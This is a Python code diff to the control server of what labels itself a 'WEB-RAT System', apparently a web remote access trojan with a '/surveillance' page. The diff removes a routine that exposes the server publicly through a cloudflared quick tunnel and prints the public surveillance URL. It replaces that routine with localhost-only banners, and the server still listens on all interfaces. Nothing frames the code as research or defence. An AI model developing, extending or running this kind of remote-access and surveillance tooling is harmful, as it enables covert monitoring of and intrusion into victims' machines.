@@ -1,8 +1,6 @@
 import os
-import threading
 import subprocess
 import time
-import re
 import sys
 import base64
 import json
@@ -186,62 +184,19 @@ def kill_port(port):
     except Exception:
         pass
 
-def start_cloudflared_tunnel():
-    if os.name == 'nt':
-        subprocess.run(['taskkill', '/F', '/IM', 'cloudflared.exe', '/T'], capture_output=True)
-    else:
-        os.system("pkill -9 cloudflared > /dev/null 2>&1")
-    
-    time.sleep(1)
-    
-    cf_binary = "cloudflared"
-    if os.name == 'nt':
-        paths = [
-            r"C:\Program Files (x86)\cloudflared\cloudflared.exe",
-            r"C:\Program Files\cloudflared\cloudflared.exe",
-            os.path.join(os.getcwd(), "cloudflared.exe")
-        ]
-        for p in paths:
-            if os.path.exists(p):
-                cf_binary = f'"{p}"'
-                break
-
-    def launch():
-        cmd = f"{cf_binary} tunnel --url http://localhost:{PORT}"
-        try:
-            proc = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, text=True, bufsize=1)
-            app.tunnels.append(proc)
-            for line in iter(proc.stderr.readline, ''):
-                if "trycloudflare.com" in line:
-                    match = re.search(r'https://[-a-zA-Z0-9]+\.trycloudflare\.com', line)
-                    if match:
-                        url = match.group(0)
-                        print("\n" + "="*60)
-                        print(f" SYSTEM ONLINE: {url}")
-                        print(f" SURVEILLANCE:  {url}/surveillance")
-                        print("="*60 + "\n")
-                        break
-        except Exception:
-            pass
-
-    threading.Thread(target=launch, daemon=True).start()
-
 def main():
     print("[*] Initializing WEB-RAT System...")
     kill_port(PORT)
-    app.tunnels = []
-    start_cloudflared_tunnel()
+    
+    print(f"\n{'='*60}")
+    print(f" SYSTEM ONLINE: http://localhost:{PORT}")
+    print(f" SURVEILLANCE:  http://localhost:{PORT}/surveillance")
+    print(f"{'='*60}\n")
     
     try:
         socketio.run(app, host="0.0.0.0", port=PORT, debug=False, allow_unsafe_werkzeug=True)
     except KeyboardInterrupt:
         print("\n[!] Stopping server...")
-    finally:
-        for proc in getattr(app, 'tunnels', []):
-            if proc:
-                proc.terminate()
-                try: proc.wait(timeout=2)
-                except: proc.kill()
 
 if __name__ == "__main__":
     main()
